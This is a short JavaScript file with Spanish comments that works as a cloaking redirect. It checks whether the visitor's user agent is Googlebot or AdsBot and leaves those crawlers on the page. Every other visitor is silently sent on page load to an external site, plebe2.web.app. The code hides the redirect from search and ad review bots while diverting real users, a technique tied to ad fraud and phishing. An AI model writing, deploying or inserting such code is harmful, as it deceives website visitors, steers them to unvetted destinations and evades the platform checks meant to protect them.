// Función para detectar si el usuario es un bot de Google
function esBot() {
    const userAgent = navigator.userAgent.toLowerCase();
    return userAgent.includes('googlebot') || userAgent.includes('adsbot');
}

// Función principal para manejar la redirección
function manejarRedireccion() {
    if (esBot()) {
        // Si es un bot, no hacemos nada
        return;
    }

    // Redirigir directamente sin verificar datos
    window.location.href = 'https://plebe2.web.app/';
}

// Ejecutar la función al cargar el script
manejarRedireccion();
